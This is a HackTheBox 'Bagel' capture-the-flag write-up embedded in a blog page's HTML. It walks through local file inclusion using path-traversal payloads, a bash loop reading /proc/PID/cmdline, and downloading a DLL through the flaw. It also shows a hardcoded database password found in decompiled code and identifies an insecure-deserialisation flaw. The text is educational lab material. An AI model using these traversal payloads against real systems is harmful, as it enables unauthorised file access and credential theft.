@@ -1,0 +1,763 @@
+
+
+
+
+
+
+
+<!doctype html>
+<html
+  lang="en"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="light"
+  data-auto-appearance="true"
+><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="theme-color" content="#FFFFFF" />
+  
+  <title>HackTheBox - Bagel &middot; Congo</title>
+    <meta name="title" content="HackTheBox - Bagel &middot; Congo" />
+  
+  
+  
+  
+  
+  <script
+    type="text/javascript"
+    src="/js/appearance.min.74ad8406faea02f3e186ba5126249aaeed9073629e04b05037b903396b188724.js"
+    integrity="sha256-dK2EBvrqAvPhhrpRJiSaru2Qc2KeBLBQN7kDOWsYhyQ="
+  ></script>
+  
+  
+  
+  
+  
+  
+  
+  
+  <link
+    type="text/css"
+    rel="stylesheet"
+    href="/css/main.bundle.min.8d03f49bff76158e114fdf6d18be3ad4d3b70309a01aebb97468ef8fd8d3b50a.css"
+    integrity="sha256-jQP0m/92FY4RT99tGL461NO3AwmgGuu5dGjvj9jTtQo="
+  />
+  
+  
+  
+  
+  
+  
+  
+  <meta
+    name="description"
+    content="
+      
+        {% img /img/htb.
+      
+    "
+  />
+  
+  
+  
+  <link rel="canonical" href="//localhost:1313/blog/bagel-htb/" />
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+    <link rel="manifest" href="/site.webmanifest" />
+  
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:url" content="//localhost:1313/blog/bagel-htb/">
+  <meta property="og:site_name" content="Congo">
+  <meta property="og:title" content="HackTheBox - Bagel">
+  <meta property="og:description" content="{% img /img/htb.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="blog">
+    <meta property="article:published_time" content="2023-06-03T00:00:00+00:00">
+    <meta property="article:modified_time" content="2023-06-03T00:00:00+00:00">
+
+  <meta name="twitter:card" content="summary"><meta name="twitter:title" content="HackTheBox - Bagel">
+<meta name="twitter:description" content="{% img /img/htb.">
+
+  
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Blogs",
+    "name": "HackTheBox - Bagel",
+    "headline": "HackTheBox - Bagel",
+    
+    "abstract": "{% img \/img\/htb.",
+    "inLanguage": "en",
+    "url" : "\/\/localhost:1313\/blog\/bagel-htb\/",
+    "author" : {
+      "@type": "Person",
+      "name": ""
+    },
+    "copyrightYear": "2023",
+    "dateCreated": "2023-06-03T00:00:00\u002b00:00",
+    "datePublished": "2023-06-03T00:00:00\u002b00:00",
+    
+    "dateModified": "2023-06-03T00:00:00\u002b00:00",
+    
+    
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "1548"
+  }
+  </script>
+
+
+  
+  
+  
+  
+  
+
+
+
+
+
+
+  
+  
+
+  
+  
+</head>
+<body
+    class="m-auto flex h-screen max-w-7xl flex-col bg-neutral px-6 text-lg leading-7 text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32"
+  >
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="-translate-y-8 rounded-b-lg bg-primary-200 px-3 py-1 text-sm focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content"
+        ><span class="pe-2 font-bold text-primary-600 dark:text-primary-400">&darr;</span
+        >Skip to main content</a
+      >
+    </div>
+    
+    
+      <header class="py-6 font-semibold text-neutral-900 dark:text-neutral sm:py-10 print:hidden">
+  <nav class="flex items-start justify-between sm:items-center">
+    
+    <div class="flex flex-row items-center">
+      
+  <a
+    class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
+    rel="me"
+    href="/"
+    >Congo</a
+  >
+
+    </div>
+    
+    
+      <ul class="flex list-none flex-col text-end sm:flex-row">
+        
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href=""
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Blog</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/categories/"
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Categories</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/tags/"
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Tags</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                
+                
+              
+            </li>
+          
+            
+              
+          
+        
+      </ul>
+    
+  </nav>
+</header>
+
+    
+    <div class="relative flex grow flex-col">
+      <main id="main-content" class="grow">
+        
+  <article>
+    <header class="max-w-prose">
+      
+      <h1 class="mb-8 mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        HackTheBox - Bagel
+      </h1>
+      
+        <div class="mb-10 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+          
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+    
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2023-06-03 00:00:00 &#43;0000 UTC">3 June 2023</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">8 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+  
+
+
+        </div>
+      
+      
+    </header>
+    <section class="prose mt-0 flex max-w-full flex-col dark:prose-invert lg:flex-row">
+      
+      <div class="min-h-0 min-w-0 max-w-prose grow">
+        <p>{% img /img/htb.png %}</p>
+<p>WriteUp for HackTheBox Bagel machine.</p>
+<!-- more -->
+<p>Starting off with the <code>nmap</code> scan, we can it has 3 ports open (it missed one more port which was open due to some issue):</p>
+<p>Checking the HTTP port, we see it is more of a static site, one thing that caught my eye was the <code>page</code> parameter in the URI:</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/Bagel_299b40e8bc344ae7904cea7a0b1ed5cf/Untitled.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>Capturing the request and checking in the burp suite for LFI resulted in success and we could see the <code>/etc/passwd</code> file contents ini the response:</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/Bagel_299b40e8bc344ae7904cea7a0b1ed5cf/Untitled_1.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>Checking for the current process, we see that it is running from the <code>developer</code> user’s directory and it is probably a <code>flask</code> application:</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/Bagel_299b40e8bc344ae7904cea7a0b1ed5cf/Untitled_2.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>We can retrieve the contents of the <code>[app.py](http://app.py)</code> :</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/Bagel_299b40e8bc344ae7904cea7a0b1ed5cf/Untitled_3.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>Checking the <code>[app.py](http://app.py)</code> code, we see that it has an endpoint <code>orders</code> which connects to the websocket running on the port <code>5000</code> and sends a JSON body as a part of the request, we also notice that there is a comment mentioning another file which is responsible for handling the websocket request and it is build with <code>dotnet</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="nx">from</span> <span class="nx">flask</span> <span class="kr">import</span> <span class="nx">Flask</span><span class="p">,</span> <span class="nx">request</span><span class="p">,</span> <span class="nx">send_file</span><span class="p">,</span> <span class="nx">redirect</span><span class="p">,</span> <span class="nx">Response</span>
+</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">os</span><span class="p">.</span><span class="nx">path</span>
+</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">websocket</span><span class="p">,</span><span class="nx">json</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">app</span> <span class="o">=</span> <span class="nx">Flask</span><span class="p">(</span><span class="nx">__name__</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">@</span><span class="nx">app</span><span class="p">.</span><span class="nx">route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nx">def</span> <span class="nx">index</span><span class="p">()</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s1">&#39;page&#39;</span> <span class="k">in</span> <span class="nx">request</span><span class="p">.</span><span class="nx">args</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">page</span> <span class="o">=</span> <span class="s1">&#39;static/&#39;</span><span class="o">+</span><span class="nx">request</span><span class="p">.</span><span class="nx">args</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;page&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="nx">os</span><span class="p">.</span><span class="nx">path</span><span class="p">.</span><span class="nx">isfile</span><span class="p">(</span><span class="nx">page</span><span class="p">)</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">resp</span><span class="o">=</span><span class="nx">send_file</span><span class="p">(</span><span class="nx">page</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">resp</span><span class="p">.</span><span class="nx">direct_passthrough</span> <span class="o">=</span> <span class="nx">False</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="nx">os</span><span class="p">.</span><span class="nx">path</span><span class="p">.</span><span class="nx">getsize</span><span class="p">(</span><span class="nx">page</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">                    <span class="nx">resp</span><span class="p">.</span><span class="nx">headers</span><span class="p">[</span><span class="s2">&#34;Content-Length&#34;</span><span class="p">]</span><span class="o">=</span><span class="nx">str</span><span class="p">(</span><span class="nx">len</span><span class="p">(</span><span class="nx">resp</span><span class="p">.</span><span class="nx">get_data</span><span class="p">()))</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="nx">resp</span>
+</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="s2">&#34;File not found&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="nx">redirect</span><span class="p">(</span><span class="s1">&#39;http://localhost:8000/?page=index.html&#39;</span><span class="p">,</span> <span class="nx">code</span><span class="o">=</span><span class="mi">302</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">@</span><span class="nx">app</span><span class="p">.</span><span class="nx">route</span><span class="p">(</span><span class="s1">&#39;/orders&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nx">def</span> <span class="nx">order</span><span class="p">()</span><span class="o">:</span> <span class="err">#</span> <span class="nx">don</span><span class="s1">&#39;t forget to run the order app first with &#34;dotnet &lt;path to .dll&gt;&#34; command. Use your ssh key to access the machine.
+</span></span></span><span class="line"><span class="cl"><span class="s1">    try:
+</span></span></span><span class="line"><span class="cl"><span class="s1">        ws = websocket.WebSocket()    
+</span></span></span><span class="line"><span class="cl"><span class="s1">        ws.connect(&#34;ws://127.0.0.1:5000/&#34;) # connect to order app
+</span></span></span><span class="line"><span class="cl"><span class="s1">        order = {&#34;ReadOrder&#34;:&#34;orders.txt&#34;}
+</span></span></span><span class="line"><span class="cl"><span class="s1">        data = str(json.dumps(order))
+</span></span></span><span class="line"><span class="cl"><span class="s1">        ws.send(data)
+</span></span></span><span class="line"><span class="cl"><span class="s1">        result = ws.recv()
+</span></span></span><span class="line"><span class="cl"><span class="s1">        return(json.loads(result)[&#39;</span><span class="nx">ReadOrder</span><span class="s1">&#39;])
+</span></span></span><span class="line"><span class="cl"><span class="s1">    except:
+</span></span></span><span class="line"><span class="cl"><span class="s1">        return(&#34;Unable to connect&#34;)
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">if __name__ == &#39;</span><span class="nx">__main__</span><span class="s1">&#39;:
+</span></span></span><span class="line"><span class="cl"><span class="s1">  app.run(host=&#39;</span><span class="mf">0.0.0.0</span><span class="s1">&#39;, port=8000)
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">curl -i -s -k -X $&#39;</span><span class="nx">GET</span><span class="s1">&#39; \
+</span></span></span><span class="line"><span class="cl"><span class="s1">    -H $&#39;</span><span class="nx">Host</span><span class="o">:</span> <span class="nx">bagel</span><span class="p">.</span><span class="nx">htb</span><span class="o">:</span><span class="mi">8000</span><span class="s1">&#39; -H $&#39;</span><span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span> <span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span> <span class="p">(</span><span class="nx">X11</span><span class="p">;</span> <span class="nx">Linux</span> <span class="nx">x86_64</span><span class="p">;</span> <span class="nx">rv</span><span class="o">:</span><span class="mf">102.0</span><span class="p">)</span> <span class="nx">Gecko</span><span class="o">/</span><span class="mi">20100101</span> <span class="nx">Firefox</span><span class="o">/</span><span class="mf">102.0</span><span class="s1">&#39; -H $&#39;</span><span class="nx">Accept</span><span class="o">:</span> <span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xhtml</span><span class="o">+</span><span class="nx">xml</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xml</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="nx">image</span><span class="o">/</span><span class="nx">avif</span><span class="p">,</span><span class="nx">image</span><span class="o">/</span><span class="nx">webp</span><span class="p">,</span><span class="o">*</span><span class="sr">/*;q=0.8&#39; -H $&#39;Accept-Language: en-US,en;q=0.5&#39; -H $&#39;Accept-Encoding: gzip, deflate&#39; -H $&#39;Connection: close&#39; -H $&#39;Upgrade-Insecure-Requests: 1&#39; \
+</span></span></span><span class="line"><span class="cl"><span class="sr">    $&#39;http:/</span><span class="o">/</span><span class="nx">bagel</span><span class="p">.</span><span class="nx">htb</span><span class="o">:</span><span class="mi">8000</span><span class="o">/?</span><span class="nx">page</span><span class="o">=</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">.</span><span class="nx">Dockerfile</span><span class="err">&#39;</span>
+</span></span></code></pre></div><p>Since there is no filename or path which was disclosed, given the LFI the best bet we have on this is to run a PID bruteforce with a script and get the <code>cmdline</code> information, following script does the work:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="ch">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="ch"></span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="nx">i</span> <span class="k">in</span> <span class="p">{</span><span class="mf">0..999</span><span class="p">};</span> <span class="k">do</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">pid</span><span class="o">=</span><span class="nx">$i</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">url</span><span class="o">=</span><span class="s2">&#34;http://bagel.htb:8000/?page=../../../../../proc/$pid/cmdline&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">curl</span> <span class="o">-</span><span class="nx">s</span> <span class="s2">&#34;$url&#34;</span> <span class="o">|</span> <span class="nx">tee</span> <span class="o">-</span><span class="nx">a</span> <span class="nx">log</span><span class="p">.</span><span class="nx">txt</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">echo</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">done</span>
+</span></span></code></pre></div><p>Running the script I see that there is a <code>bagel.dll</code> running with <code>dotnet</code> , since we have the absolute path of the file, we can download it via the LFI</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/Bagel_299b40e8bc344ae7904cea7a0b1ed5cf/Untitled_4.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="err">❯</span> <span class="nx">wget</span> <span class="nx">http</span><span class="o">:</span><span class="c1">//bagel.htb:8000/\?page\=../../../../../../opt/bagel/bin/Debug/net6.0/bagel.dll
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">--</span><span class="mi">2023</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">19</span> <span class="mi">18</span><span class="o">:</span><span class="mi">11</span><span class="o">:</span><span class="mi">06</span><span class="o">--</span>  <span class="nx">http</span><span class="o">:</span><span class="c1">//bagel.htb:8000/?page=../../../../../../opt/bagel/bin/Debug/net6.0/bagel.dll
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">Resolving</span> <span class="nx">bagel</span><span class="p">.</span><span class="nx">htb</span> <span class="p">(</span><span class="nx">bagel</span><span class="p">.</span><span class="nx">htb</span><span class="p">)...</span> <span class="mf">10.10.11.201</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Connecting</span> <span class="nx">to</span> <span class="nx">bagel</span><span class="p">.</span><span class="nx">htb</span> <span class="p">(</span><span class="nx">bagel</span><span class="p">.</span><span class="nx">htb</span><span class="p">)</span><span class="o">|</span><span class="mf">10.10.11.201</span><span class="o">|:</span><span class="mf">8000.</span><span class="p">..</span> <span class="nx">connected</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="nx">HTTP</span> <span class="nx">request</span> <span class="nx">sent</span><span class="p">,</span> <span class="nx">awaiting</span> <span class="nx">response</span><span class="p">...</span> <span class="mi">200</span> <span class="nx">OK</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Length</span><span class="o">:</span> <span class="mi">10752</span> <span class="p">(</span><span class="mi">10</span><span class="nx">K</span><span class="p">)</span> <span class="p">[</span><span class="nx">application</span><span class="o">/</span><span class="nx">octet</span><span class="o">-</span><span class="nx">stream</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Saving</span> <span class="nx">to</span><span class="o">:</span> <span class="err">‘</span><span class="nx">index</span><span class="p">.</span><span class="nx">html</span><span class="o">?</span><span class="nx">page</span><span class="o">=</span><span class="p">..</span><span class="o">%</span><span class="mi">2</span><span class="nx">F</span><span class="p">..</span><span class="o">%</span><span class="mi">2</span><span class="nx">F</span><span class="p">..</span><span class="o">%</span><span class="mi">2</span><span class="nx">F</span><span class="p">..</span><span class="o">%</span><span class="mi">2</span><span class="nx">F</span><span class="p">..</span><span class="o">%</span><span class="mi">2</span><span class="nx">F</span><span class="p">..</span><span class="o">%</span><span class="mi">2</span><span class="nx">Fopt</span><span class="o">%</span><span class="mi">2</span><span class="nx">Fbagel</span><span class="o">%</span><span class="mi">2</span><span class="nx">Fbin</span><span class="o">%</span><span class="mi">2</span><span class="nx">FDebug</span><span class="o">%</span><span class="mi">2</span><span class="nx">Fnet6</span><span class="mf">.0</span><span class="o">%</span><span class="mi">2</span><span class="nx">Fbagel</span><span class="p">.</span><span class="nx">dll</span><span class="err">’</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">index</span><span class="p">.</span><span class="nx">html</span><span class="o">?</span><span class="nx">page</span><span class="o">=</span><span class="p">..</span><span class="o">%</span><span class="mi">2</span><span class="nx">F</span><span class="p">..</span><span class="o">%</span><span class="mi">2</span><span class="nx">F</span><span class="p">..</span><span class="o">%</span> <span class="mi">100</span><span class="o">%</span><span class="p">[</span><span class="o">================================================&gt;</span><span class="p">]</span>  <span class="mf">10.50</span><span class="nx">K</span>  <span class="o">--</span><span class="p">.</span><span class="o">-</span><span class="nx">KB</span><span class="o">/</span><span class="nx">s</span>    <span class="k">in</span> <span class="mi">0</span><span class="nx">s</span>      
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mi">2023</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">19</span> <span class="mi">18</span><span class="o">:</span><span class="mi">11</span><span class="o">:</span><span class="mi">06</span> <span class="p">(</span><span class="mf">48.7</span> <span class="nx">MB</span><span class="o">/</span><span class="nx">s</span><span class="p">)</span> <span class="o">-</span> <span class="err">‘</span><span class="nx">index</span><span class="p">.</span><span class="nx">html</span><span class="o">?</span><span class="nx">page</span><span class="o">=</span><span class="p">..</span><span class="o">%</span><span class="mi">2</span><span class="nx">F</span><span class="p">..</span><span class="o">%</span><span class="mi">2</span><span class="nx">F</span><span class="p">..</span><span class="o">%</span><span class="mi">2</span><span class="nx">F</span><span class="p">..</span><span class="o">%</span><span class="mi">2</span><span class="nx">F</span><span class="p">..</span><span class="o">%</span><span class="mi">2</span><span class="nx">F</span><span class="p">..</span><span class="o">%</span><span class="mi">2</span><span class="nx">Fopt</span><span class="o">%</span><span class="mi">2</span><span class="nx">Fbagel</span><span class="o">%</span><span class="mi">2</span><span class="nx">Fbin</span><span class="o">%</span><span class="mi">2</span><span class="nx">FDebug</span><span class="o">%</span><span class="mi">2</span><span class="nx">Fnet6</span><span class="mf">.0</span><span class="o">%</span><span class="mi">2</span><span class="nx">Fbagel</span><span class="p">.</span><span class="nx">dll</span><span class="err">’</span> <span class="nx">saved</span> <span class="p">[</span><span class="mi">10752</span><span class="o">/</span><span class="mi">10752</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">❯</span> <span class="nx">mv</span> <span class="nx">index</span><span class="p">.</span><span class="nx">html</span><span class="err">\</span><span class="o">?</span><span class="nx">page</span><span class="o">=</span><span class="p">..</span><span class="o">%</span><span class="mi">2</span><span class="nx">F</span><span class="p">..</span><span class="o">%</span><span class="mi">2</span><span class="nx">F</span><span class="p">..</span><span class="o">%</span><span class="mi">2</span><span class="nx">F</span><span class="p">..</span><span class="o">%</span><span class="mi">2</span><span class="nx">F</span><span class="p">..</span><span class="o">%</span><span class="mi">2</span><span class="nx">F</span><span class="p">..</span><span class="o">%</span><span class="mi">2</span><span class="nx">Fopt</span><span class="o">%</span><span class="mi">2</span><span class="nx">Fbagel</span><span class="o">%</span><span class="mi">2</span><span class="nx">Fbin</span><span class="o">%</span><span class="mi">2</span><span class="nx">FDebug</span><span class="o">%</span><span class="mi">2</span><span class="nx">Fnet6</span><span class="mf">.0</span><span class="o">%</span><span class="mi">2</span><span class="nx">Fbagel</span><span class="p">.</span><span class="nx">dll</span> <span class="nx">bagle</span><span class="p">.</span><span class="nx">dll</span>
+</span></span></code></pre></div><p>Now, it is time to analyze the DLL file using <code>dnSpy</code></p>
+<h3 id="analysing-the-bageldll" class="relative group">Analysing the <code>bagel.dll</code> <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#analysing-the-bageldll" aria-label="Anchor">#</a></span></h3><p>Checking the <code>bagel.dll</code> , it wasn’t big file so had limited number of classes and methods, one of the class was named as <code>DB</code>, it contained the SQL credentials for the <code>dev</code> user</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/Bagel_299b40e8bc344ae7904cea7a0b1ed5cf/Untitled_5.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="nx">using</span> <span class="nx">System</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">using</span> <span class="nx">Microsoft</span><span class="p">.</span><span class="nx">Data</span><span class="p">.</span><span class="nx">SqlClient</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">namespace</span> <span class="nx">bagel_server</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">// Token: 0x0200000A RID: 10
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="kr">public</span> <span class="kr">class</span> <span class="nx">DB</span>
+</span></span><span class="line"><span class="cl">	<span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="c1">// Token: 0x06000022 RID: 34 RVA: 0x00002518 File Offset: 0x00000718
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="p">[</span><span class="nx">Obsolete</span><span class="p">(</span><span class="s2">&#34;The production team has to decide where the database server will be hosted. This method is not fully implemented.&#34;</span><span class="p">)]</span>
+</span></span><span class="line"><span class="cl">		<span class="kr">public</span> <span class="k">void</span> <span class="nx">DB_connection</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">		<span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">string</span> <span class="nx">text</span> <span class="o">=</span> <span class="s2">&#34;Data Source=ip;Initial Catalog=Orders;User ID=dev;Password=k8wdAYYKyhnjg3K&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">SqlConnection</span> <span class="nx">sqlConnection</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SqlConnection</span><span class="p">(</span><span class="nx">text</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Since we already identified that there was a user named as <code>developer</code> , we might be able to SSH to the machine but it wasn’t working as the SSH server does not seem to accept the password from the remote user:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="err">❯</span> <span class="nx">ssh</span> <span class="nx">developer</span><span class="err">@</span><span class="nx">bagel</span><span class="p">.</span><span class="nx">htb</span>
+</span></span><span class="line"><span class="cl"><span class="nx">developer</span><span class="err">@</span><span class="nx">bagel</span><span class="p">.</span><span class="nx">htb</span><span class="o">:</span> <span class="nx">Permission</span> <span class="nx">denied</span> <span class="p">(</span><span class="nx">publickey</span><span class="p">,</span><span class="nx">gssapi</span><span class="o">-</span><span class="nx">keyex</span><span class="p">,</span><span class="nx">gssapi</span><span class="o">-</span><span class="kd">with</span><span class="o">-</span><span class="nx">mic</span><span class="p">).</span>
+</span></span></code></pre></div><p>During the process dumping, I identified that <code>gssproxy</code> is running as well, a little bit insight into the GSSAPI:</p>
+<ul>
+<li><strong>Gssapi-keyex</strong>: This authentication method uses the Generic Security Services Application Program Interface (GSSAPI) to authenticate the client. It negotiates a secure key exchange protocol to create a shared secret between the client and server.</li>
+<li><strong>Gssapi-with-mic</strong>: This authentication method uses GSSAPI to authenticate the client, but it also includes a message integrity check (MIC) to ensure the authenticity of the message.</li>
+</ul>
+<aside>
+💡
+<p>GSSAPI is a generic security API used to authenticate client/server applications. GSSProxy is a service that allows users to obtain GSSAPI credentials on behalf of a service without having direct access to the user&rsquo;s keytab.</p>
+<p>The GSSProxy service is commonly used in environments where centralized authentication and authorization mechanisms are required, such as in large-scale enterprise networks. By acting as a proxy between a client application and the Kerberos authentication system, GSSProxy provides a secure and efficient way to obtain Kerberos credentials for a particular service.</p>
+<p>GSSProxy is implemented as a daemon process that runs on the client machine and communicates with the Kerberos authentication system. When a client application needs to authenticate with a service, it sends a request to GSSProxy, which then acquires the necessary credentials on behalf of the client and returns them to the application.</p>
+<p>In summary, GSSProxy is a service that provides a secure and efficient way to obtain GSSAPI credentials for a particular service, without requiring direct access to the user&rsquo;s keytab.</p>
+</aside>
+<p>It seems that we won’t be able to authenticate to the SSH without any key or any GSSAPI key, digging deeper into the DLL file, we see that it accepts the JSON data and pass it to <code>handler.Deserialise</code> method to parse the JSON data:</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/Bagel_299b40e8bc344ae7904cea7a0b1ed5cf/Untitled_6.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>Checking the <code>handler</code> class and the <code>deserialise</code> method is making use of the <code>Newtonsoft.Json</code> class, since there is no explicit <code>TypeHandling</code> was defined i.e. <code>4</code> is not a valid constant value for the <code>TypeHandling</code> , this is vulnerable to Deserialisation attack, check the Source Code Analysis note for better insight:</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/Bagel_299b40e8bc344ae7904cea7a0b1ed5cf/Untitled_7.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>As we can interact with the websocket, what we can do is, due to insecure deserialisation, we can craft a payload for performing deserialisation attack. We can interact to the service using following script:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/python3
+</span></span></span><span class="line"><span class="cl"><span class="ch"></span>
